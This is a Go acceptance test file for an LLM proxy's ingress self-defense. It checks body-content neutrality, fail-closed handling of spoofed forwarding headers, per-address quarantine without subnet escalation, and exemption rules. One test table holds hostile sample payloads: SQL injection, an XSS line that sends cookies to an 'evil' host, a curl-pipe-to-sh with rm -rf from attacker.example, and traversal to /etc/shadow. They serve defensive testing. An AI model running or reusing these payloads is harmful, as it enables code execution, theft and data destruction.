// This file is the boundary half of the composed ingress self-defense
// acceptance certification (spec GROUP 7, task 7.2). It certifies the
// false-positive, forwarding-spoofing and identity-isolation guarantees through
// the real composed [stackHTTPHandler] graph, against a real
// [ingressdefense.State] and a real transport-auth chain.
//
// The authentication half of the certification, and the shared fixture helpers
// (composed stack, mounted LLM route, real provider chains, injected instant),
// live in selfdefense_acceptance_auth_test.go. The composed standard
// distribution round trips, the bounded unique-address churn and the real
// registry cardinality evidence live in
// internal/infra/runtimebundle/self_defense_acceptance_test.go.
package stdhttp

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/netip"
	"strings"
	"testing"
	"time"

	coregeoip "github.com/aiproxer/aiproxer/internal/core/geoip"
	"github.com/aiproxer/aiproxer/internal/core/ingressdefense"
	geoipingress "github.com/aiproxer/aiproxer/internal/stdhttp/geoip"
)

// TestAcceptanceFalsePositiveBodyContentIsNotInspected is the composed
// body-content-neutrality guarantee of requirement 10.3. Prompt text containing
// SQL injection strings, XSS payloads, shell commands, malware-analysis prose or
// traversal examples on an otherwise legitimate proxy route must not match
// self-defense. The mounted route asserts the exact bytes it received, so a gate
// that read, consumed, rewrote or truncated the body could not pass, and the
// absence of any adaptive state or observation proves the content was never
// scored.
func TestAcceptanceFalsePositiveBodyContentIsNotInspected(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		name    string
		payload string
	}{
		{name: "SQL injection", payload: `SELECT * FROM users WHERE name = 'x' OR 1=1; DROP TABLE audit_log; --`},
		{name: "XSS", payload: `<script>alert(document.cookie)</script><img src=x onerror="fetch('//evil/'+document.cookie)">`},
		{name: "shell command", payload: `curl -s http://attacker.example/x.sh | sh; rm -rf /var/data && whoami`},
		{name: "malware analysis prose", payload: `classify this dropper: powershell -enc SQBFAFgA downloading rat.exe, obfuscated with XOR 0x5A`},
		{name: "path traversal", payload: `read ../../../../etc/shadow and ../../../proc/self/environ for triage`},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			chain := acceptanceLocalAPIKeyChain(t)
			stack := newAcceptanceStack(t, acceptanceOptions{
				providers:       chain.providers,
				impossiblePaths: true,
			})
			prompt, err := json.Marshal(tc.payload)
			if err != nil {
				t.Fatal(err)
			}
			body := []byte(`{"model":"acceptance-model","messages":[{"role":"user","content":` + string(prompt) + `}]}`)

			rec := acceptanceServe(stack.handler, acceptanceBodyRequest(acceptanceRoute, "198.51.100.73:443", acceptanceAPIKey, body))
			if rec.Code != http.StatusOK {
				t.Fatalf("legitimate LLM request carrying %s = %d, want the route's 200: self-defense must never refuse on body content", tc.name, rec.Code)
			}
			if stack.frontend.calls != 1 {
				t.Fatalf("route calls = %d, want 1: the legitimate route must run", stack.frontend.calls)
			}
			if stack.frontend.lastErr != nil {
				t.Fatalf("route read the body with error %v, want the untouched stream", stack.frontend.lastErr)
			}
			if string(stack.frontend.lastBody) != string(body) {
				t.Fatalf("route received %q, want the exact request bytes %q", stack.frontend.lastBody, body)
			}
			if got := stack.state.Len(); got != 0 {
				t.Fatalf("adaptive entries = %d, want 0: body content is never hostile evidence", got)
			}
			if len(stack.observer.denials) != 0 || len(stack.observer.transitions) != 0 {
				t.Fatalf("observations = %v/%v, want none for a legitimate body", stack.observer.denials, stack.observer.transitions)
			}
		})
	}
}

// TestAcceptanceSpoofResistanceFailsClosedBeforeFrontendDecode is the composed
// forwarded-header guarantee of requirements 2.1-2.3. An untrusted peer cannot
// choose its tracked identity and cannot borrow or escalate a quarantine it does
// not own, a trusted chain is honored, and a chain that is malformed, oversized,
// overlong or contains no untrusted hop fails CLOSED with a generic 403 that
// never reaches the mounted frontend route and never mutates adaptive state.
func TestAcceptanceSpoofResistanceFailsClosedBeforeFrontendDecode(t *testing.T) {
	t.Parallel()

	oversized := strings.Repeat("198.51.100.9,", geoipingress.MaxForwardedHeaderBytes/coregeoip.MaxForwardedHeaderBytes+2)
	overlong := strings.TrimSuffix(strings.Repeat("198.51.100.9,", geoipingress.MaxForwardedHops+1), ",")
	if len(overlong) > geoipingress.MaxForwardedHeaderBytes {
		t.Fatal("the overlong fixture must stay inside the byte bound so it isolates the hop bound")
	}

	for _, tc := range []struct {
		name string
		// remote is the immediate direct peer.
		remote string
		// forwarded is the X-Forwarded-For chain the peer presents.
		forwarded []string
		target    string
		// seedQuarantined are exact addresses the process state already holds a
		// quarantine for, which is the state a shared-NAT attacker would try to
		// escape by forging its identity.
		seedQuarantined    []string
		wantCode           int
		wantEntryCount     int
		wantQuarantined    []string
		wantNotQuarantined []string
		// wantNotEscalated lists addresses that must keep their FIRST-offense
		// window, proving the request added no offense to them.
		wantNotEscalated []string
	}{
		{
			name:      "an untrusted peer cannot borrow or escalate a quarantine it does not own",
			remote:    "203.0.113.200:443",
			forwarded: []string{"198.51.100.74"},
			target:    "/v1/models",
			// Two entries: the seeded victim and the spoofing peer's own
			// below-threshold 401 evidence. The victim is not escalated and the
			// peer is not quarantined.
			seedQuarantined:    []string{"198.51.100.74"},
			wantCode:           http.StatusUnauthorized,
			wantEntryCount:     2,
			wantQuarantined:    []string{"198.51.100.74"},
			wantNotQuarantined: []string{"203.0.113.200"},
			wantNotEscalated:   []string{"198.51.100.74"},
		},
		{
			name:               "an untrusted peer's spoofed header never creates the spoofed entry",
			remote:             "203.0.113.201:443",
			forwarded:          []string{"198.51.100.75"},
			target:             "/.env",
			wantCode:           http.StatusNotFound,
			wantEntryCount:     1,
			wantQuarantined:    []string{"203.0.113.201"},
			wantNotQuarantined: []string{"198.51.100.75"},
		},
		{
			name:               "a trusted chain resolves the first untrusted hop",
			remote:             "10.0.0.9:1234",
			forwarded:          []string{"198.51.100.76, 10.0.0.8"},
			target:             "/.env",
			wantCode:           http.StatusNotFound,
			wantEntryCount:     1,
			wantQuarantined:    []string{"198.51.100.76"},
			wantNotQuarantined: []string{"10.0.0.9", "10.0.0.8"},
		},
		{
			name:           "a malformed chain fails closed before the frontend",
			remote:         "10.0.0.9:1234",
			forwarded:      []string{"not-an-ip"},
			target:         "/v1/models",
			wantCode:       http.StatusForbidden,
			wantEntryCount: 0,
		},
		{
			name:           "an all-trusted chain with no client hop fails closed before the frontend",
			remote:         "10.0.0.9:1234",
			forwarded:      []string{"10.0.0.8, 10.0.0.7"},
			target:         "/v1/models",
			wantCode:       http.StatusForbidden,
			wantEntryCount: 0,
		},
		{
			name:           "an oversized chain fails closed before the frontend",
			remote:         "10.0.0.9:1234",
			forwarded:      []string{oversized},
			target:         "/v1/models",
			wantCode:       http.StatusForbidden,
			wantEntryCount: 0,
		},
		{
			name:           "an overlong hop chain fails closed before the frontend",
			remote:         "10.0.0.9:1234",
			forwarded:      []string{overlong},
			target:         "/v1/models",
			wantCode:       http.StatusForbidden,
			wantEntryCount: 0,
		},
		{
			name:           "a missing authoritative header on a trusted peer fails closed before the frontend",
			remote:         "10.0.0.9:1234",
			forwarded:      nil,
			target:         "/v1/models",
			wantCode:       http.StatusForbidden,
			wantEntryCount: 0,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			t.Parallel()

			chain := acceptanceLocalAPIKeyChain(t)
			stack := newAcceptanceStack(t, acceptanceOptions{
				providers: chain.providers,
				resolver: GeoIPResolverConfig{
					Source:         "x_forwarded_for",
					TrustedProxies: []netip.Prefix{netip.MustParsePrefix("10.0.0.0/8")},
				},
				impossiblePaths: true,
			})
			for _, seeded := range tc.seedQuarantined {
				stack.state.RecordProbe(netip.MustParseAddr(seeded), acceptanceNow, stack.policy)
			}
			invocations := chain.invocations()
			req := acceptanceForwardedRequest(tc.target, tc.remote, tc.forwarded)
			rec := acceptanceServe(stack.handler, req)
			if rec.Code != tc.wantCode {
				t.Fatalf("status = %d, want %d", rec.Code, tc.wantCode)
			}
			if tc.wantCode == http.StatusForbidden {
				if rec.Body.String() != "Forbidden\n" {
					t.Fatalf("fail-closed body = %q, want the generic body", rec.Body.String())
				}
				if stack.frontend.calls != 0 {
					t.Fatalf("route calls = %d, want 0: a fail-closed resolution must not reach the frontend", stack.frontend.calls)
				}
				if chain.invocations() != invocations {
					t.Fatal("a fail-closed resolution must fail before frontend decode, model work and authentication")
				}
			}
			if got := stack.state.Len(); got != tc.wantEntryCount {
				t.Fatalf("adaptive entries = %d, want %d", got, tc.wantEntryCount)
			}
			for _, tracked := range tc.wantQuarantined {
				if !stack.state.IsQuarantined(netip.MustParseAddr(tracked), acceptanceNow) {
					t.Fatalf("address %s must be tracked as the resolved client identity", tracked)
				}
			}
			for _, absent := range tc.wantNotQuarantined {
				if stack.state.IsQuarantined(netip.MustParseAddr(absent), acceptanceNow) {
					t.Fatalf("address %s must never be quarantined from a request that did not resolve to it", absent)
				}
			}
			for _, victim := range tc.wantNotEscalated {
				if stack.state.IsQuarantined(netip.MustParseAddr(victim), acceptanceNow.Add(stack.policy.InitialQuarantine+time.Minute)) {
					t.Fatalf("address %s must keep its first-offense window: a spoofing request added no offense to it", victim)
				}
			}
			if tc.wantCode == http.StatusForbidden {
				if got := acceptanceCountReasons(stack.observer.denials, ingressdefense.ReasonClientIPError); got != 1 {
					t.Fatalf("client_ip_error denials = %d, want exactly 1 (%v)", got, stack.observer.denials)
				}
				if got := acceptanceCountReasons(stack.observer.denials, ingressdefense.ReasonImpossiblePath); got != 0 {
					t.Fatalf("impossible-path denials = %d, want 0: resolution fails before matching", got)
				}
			}
		})
	}
}

// acceptanceForwardedRequest builds one bodyless data-plane request that presents
// exactly the forwarding header values the peer claims, in order.
func acceptanceForwardedRequest(target, remote string, forwarded []string) *http.Request {
	req := httptest.NewRequest(http.MethodGet, "http://example.test"+target, nil)
	req.RemoteAddr = remote
	for _, value := range forwarded {
		req.Header.Add("X-Forwarded-For", value)
	}
	return req
}

// TestAcceptanceIPv4MappedNormalizationAndNoSubnetEscalation is the composed
// identity-separation guarantee of requirements 2.4, 5.6 and 6.1-6.5. The
// IPv4-mapped IPv6 and plain forms of one host share exactly one adaptive entry,
// and one hostile address leaves its immediate neighbours, its whole /24 and its
// whole /64 untracked and un-quarantined: v1 never escalates a single-address
// offense into an aggregate network ban.
//
// The closing assertion is the strongest form: after every neighbour
// authenticated and cleared its OWN exact entry, only the two hostile addresses
// remain, so the store provably holds no prefix-keyed state at all.
func TestAcceptanceIPv4MappedNormalizationAndNoSubnetEscalation(t *testing.T) {
	t.Parallel()

	chain := acceptanceLocalAPIKeyChain(t)
	stack := newAcceptanceStack(t, acceptanceOptions{
		providers:       chain.providers,
		impossiblePaths: true,
	})
	hostile4 := netip.MustParseAddr("198.51.100.80")
	hostile6 := netip.MustParseAddr("2001:db8:cafe::1")

	// One hostile probe from the IPv4-mapped form of the hostile address.
	rec := acceptanceServe(stack.handler, acceptanceRequest(http.MethodGet, "/.env", acceptanceHostPort("::ffff:198.51.100.80"), ""))
	if rec.Code != http.StatusNotFound {
		t.Fatalf("mapped-form probe = %d, want the generic 404", rec.Code)
	}
	if !stack.state.IsQuarantined(hostile4, acceptanceNow) {
		t.Fatal("the IPv4-mapped form must normalize onto the same adaptive entry as the plain form")
	}
	// The plain form of the same host is the same identity, not a second entry.
	rec = acceptanceServe(stack.handler, acceptanceRequest(http.MethodGet, "/.env", acceptanceHostPort(hostile4.String()), ""))
	if rec.Code != http.StatusNotFound {
		t.Fatalf("plain-form probe = %d, want the generic 404", rec.Code)
	}
	if got := stack.state.Len(); got != 1 {
		t.Fatalf("adaptive entries = %d, want 1: the mapped and plain forms of one host are one identity", got)
	}

	// A second hostile address on the other family, so a /24 and a /64
	// neighbourhood each contain a tracked host.
	rec = acceptanceServe(stack.handler, acceptanceRequest(http.MethodGet, "/.git/config", acceptanceHostPort(hostile6.String()), ""))
	if rec.Code != http.StatusNotFound {
		t.Fatalf("IPv6 probe = %d, want the generic 404", rec.Code)
	}
	if !stack.state.IsQuarantined(hostile6, acceptanceNow) {
		t.Fatal("the IPv6 hostile address must be tracked")
	}
	if got := stack.state.Len(); got != 2 {
		t.Fatalf("adaptive entries = %d, want exactly the two hostile addresses", got)
	}
	// The fixture is only meaningful when both neighbourhoods really contain a
	// tracked host.
	for _, prefix := range []string{"198.51.100.0/24", "2001:db8:cafe::/64"} {
		p := netip.MustParsePrefix(prefix)
		if !p.Contains(hostile4) && !p.Contains(hostile6) {
			t.Fatalf("fixture prefix %s contains neither hostile address", prefix)
		}
	}

	// Every neighbour of either hostile address stays unquarantined: its own
	// credential-free traffic is never refused in front of authentication, and
	// its own valid credential is served normally.
	neighbours := []string{
		"198.51.100.79", "198.51.100.81", "198.51.100.1", "198.51.100.255",
		"2001:db8:cafe::2", "2001:db8:cafe::", "2001:db8:cafe::ffff",
	}
	for _, neighbour := range neighbours {
		addr := netip.MustParseAddr(neighbour)
		if stack.state.IsQuarantined(addr, acceptanceNow) {
			t.Fatalf("neighbour %s must never inherit a single-address offense", neighbour)
		}
		invocations := chain.invocations()
		rec := acceptanceServe(stack.handler, acceptanceRequest(http.MethodPost, acceptanceRoute, acceptanceHostPort(neighbour), ""))
		if rec.Code == http.StatusTooManyRequests {
			t.Fatalf("neighbour %s was refused by a quarantine it never earned", neighbour)
		}
		rec = acceptanceServe(stack.handler, acceptanceRequest(http.MethodPost, acceptanceRoute, acceptanceHostPort(neighbour), acceptanceAPIKey))
		if rec.Code != http.StatusOK {
			t.Fatalf("neighbour %s with a valid credential = %d, want the route's 200", neighbour, rec.Code)
		}
		if got := chain.invocations(); got != invocations+2 {
			t.Fatalf("auth chain invocations for neighbour %s = %d, want both of its requests to authenticate", neighbour, got-invocations)
		}
		if stack.state.IsQuarantined(addr, acceptanceNow) {
			t.Fatalf("neighbour %s must stay unquarantined after its own successful authentication", neighbour)
		}
	}
	// After every neighbour authenticated and cleared its own exact entry, only
	// the two hostile addresses remain: there is no prefix-keyed state at all.
	if got := stack.state.Len(); got != 2 {
		t.Fatalf("adaptive entries = %d, want exactly the two hostile addresses and no subnet state", got)
	}
}

// TestAcceptanceAdaptiveExemptionRefusesWithoutAccruingState is the composed
// adaptive-exemption guarantee of requirements 3.5 and 8.3. An adaptively
// exempt source still receives the deterministic generic 404 for an impossible
// path, still accrues no adaptive state from that hit, is never refused by a
// quarantine the process state already holds for it, and its exemption never
// makes a route reachable that the auth chain refuses.
func TestAcceptanceAdaptiveExemptionAccruesNoAuthFailureState(t *testing.T) {
	t.Parallel()

	const (
		exemptHost = "203.0.113.20"
		otherHost  = "198.51.100.20"
	)
	policy := acceptancePolicy(acceptanceThreshold)
	policy.AdaptiveExemptCIDRs = []netip.Prefix{netip.MustParsePrefix("203.0.113.0/24")}
	chain := acceptanceLocalAPIKeyChain(t)
	stack := newAcceptanceStack(t, acceptanceOptions{
		providers:       chain.providers,
		policy:          &policy,
		impossiblePaths: true,
	})

	// An exempt source presenting a wrong credential reaches the auth chain and is
	// rejected there, exactly as a non-exempt source would be.
	rec := acceptanceServe(stack.handler, acceptanceRequest(http.MethodPost, acceptanceRoute, exemptHost+":443", "sk-aip-acceptance-wrong-0002"))
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("exempt invalid credential = %d, want the auth chain's 401", rec.Code)
	}
	// The counted failure must not create adaptive state for the exempt address.
	if got := stack.state.Len(); got != 0 {
		t.Fatalf("adaptive entries = %d, want 0: an exempt source must accrue no auth-failure state", got)
	}
	if len(stack.observer.transitions) != 0 {
		t.Fatalf("transitions = %v, want none from an exempt source", stack.observer.transitions)
	}
	// A NON-exempt source under the same policy still accrues, so the filter is a
	// genuine exemption and not a disabled observation path.
	rec = acceptanceServe(stack.handler, acceptanceRequest(http.MethodPost, acceptanceRoute, otherHost+":443", "sk-aip-acceptance-wrong-0002"))
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("non-exempt invalid credential = %d, want the auth chain's 401", rec.Code)
	}
	if got := stack.state.Len(); got == 0 {
		t.Fatal("adaptive entries = 0, want a non-exempt source to accrue auth-failure state")
	}
}

func TestAcceptanceAdaptiveExemptionRefusesWithoutAccruingState(t *testing.T) {
	t.Parallel()

	const exemptHost = "203.0.113.10"
	policy := acceptancePolicy(acceptanceThreshold)
	policy.AdaptiveExemptCIDRs = []netip.Prefix{netip.MustParsePrefix("203.0.113.0/24")}
	chain := acceptanceLocalAPIKeyChain(t)
	stack := newAcceptanceStack(t, acceptanceOptions{
		providers:       chain.providers,
		policy:          &policy,
		impossiblePaths: true,
	})

	rec := acceptanceServe(stack.handler, acceptanceRequest(http.MethodGet, "/.env", exemptHost+":443", ""))
	if rec.Code != http.StatusNotFound || rec.Body.String() != "Not Found\n" {
		t.Fatalf("exempt impossible path = %d %q, want the generic 404", rec.Code, rec.Body.String())
	}
	if got := stack.state.Len(); got != 0 {
		t.Fatalf("adaptive entries = %d, want 0: an exempt source must accrue no adaptive state", got)
	}
	if len(stack.observer.transitions) != 0 {
		t.Fatalf("transitions = %v, want none from an exempt source", stack.observer.transitions)
	}
	// The exemption is not a route grant: the auth chain stays authoritative.
	rec = acceptanceServe(stack.handler, acceptanceRequest(http.MethodPost, acceptanceRoute, exemptHost+":443", ""))
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("exempt legitimate route without a credential = %d, want the auth chain's 401", rec.Code)
	}
	if stack.frontend.calls != 0 {
		t.Fatalf("route calls = %d, want 0", stack.frontend.calls)
	}
	// A valid credential still works and reaches the route.
	rec = acceptanceServe(stack.handler, acceptanceRequest(http.MethodPost, acceptanceRoute, exemptHost+":443", acceptanceAPIKey))
	if rec.Code != http.StatusOK || stack.frontend.calls != 1 {
		t.Fatalf("exempt valid credential = %d with %d route calls, want 200 with 1", rec.Code, stack.frontend.calls)
	}

	// The gate delegates an exempt source before it ever consults quarantine
	// state, so a quarantine the process state already holds for the exact exempt
	// address can never refuse it in front of authentication.
	stack.state.RecordProbe(netip.MustParseAddr(exemptHost), acceptanceNow, policy)
	if !stack.state.IsQuarantined(netip.MustParseAddr(exemptHost), acceptanceNow) {
		t.Fatal("the fixture must leave a quarantine the exempt source could be refused by")
	}
	rec = acceptanceServe(stack.handler, acceptanceRequest(http.MethodPost, acceptanceRoute, exemptHost+":443", ""))
	if rec.Code != http.StatusUnauthorized {
		t.Fatalf("quarantined exempt source without a credential = %d, want the auth chain's 401: the gate must delegate an exempt source", rec.Code)
	}
	rec = acceptanceServe(stack.handler, acceptanceRequest(http.MethodPost, acceptanceRoute, exemptHost+":443", acceptanceAPIKey))
	if rec.Code != http.StatusOK {
		t.Fatalf("quarantined exempt source with a valid credential = %d, want the route's 200", rec.Code)
	}
}

// TestAcceptanceAdaptiveExemptionNeverOverridesGeoIPHardDenial is the composed
// requirement 8.3 boundary: an adaptively exempt source that a fixed GeoIP CIDR
// policy denies still gets the fixed hard denial, and that denial stays invisible
// to adaptive state. The paired non-denied source proves the 403 is the fixed
// policy's decision and not a blanket block.
func TestAcceptanceAdaptiveExemptionNeverOverridesGeoIPHardDenial(t *testing.T) {
	t.Parallel()

	geoPolicy, err := coregeoip.Compile(coregeoip.CompileInput{
		Order: coregeoip.OrderDenyAllow,
		Deny:  coregeoip.RuleConfig{CIDRs: []string{"203.0.113.0/24"}},
	})
	if err != nil {
		t.Fatal(err)
	}
	policy := acceptancePolicy(acceptanceThreshold)
	policy.AdaptiveExemptCIDRs = []netip.Prefix{netip.MustParsePrefix("203.0.113.0/24")}
	chain := acceptanceLocalAPIKeyChain(t)
	stack := newAcceptanceStack(t, acceptanceOptions{
		providers: chain.providers,
		policy:    &policy,
		geoPolicy: GeoIPSecurityInput{
			Policy:   geoPolicy,
			Lookup:   stackGeoIPLookup{},
			Resolver: GeoIPResolverConfig{Source: "direct"},
		},
		impossiblePaths: true,
	})

	rec := acceptanceServe(stack.handler, acceptanceRequest(http.MethodGet, "/.env", "203.0.113.10:443", acceptanceAPIKey))
	if rec.Code != http.StatusForbidden {
		t.Fatalf("GeoIP-denied exempt source = %d, want the fixed hard denial 403", rec.Code)
	}
	if stack.frontend.calls != 0 {
		t.Fatalf("route calls = %d, want 0", stack.frontend.calls)
	}
	if got := stack.state.Len(); got != 0 {
		t.Fatalf("adaptive entries = %d, want 0: a fixed denial is invisible to adaptive state", got)
	}
	if len(stack.observer.denials) != 0 {
		t.Fatalf("self-defense denials = %v, want none: the fixed gate wins before self-defense", stack.observer.denials)
	}

	// A source the fixed policy does not deny is still served by self-defense,
	// which proves the 403 above is the fixed policy's decision.
	rec = acceptanceServe(stack.handler, acceptanceRequest(http.MethodGet, "/.env", "198.51.100.90:443", acceptanceAPIKey))
	if rec.Code != http.StatusNotFound {
		t.Fatalf("non-denied source impossible path = %d, want the self-defense generic 404", rec.Code)
	}
	if got := stack.state.Len(); got != 1 {
		t.Fatalf("adaptive entries = %d, want 1 recorded for the non-denied source", got)
	}
}
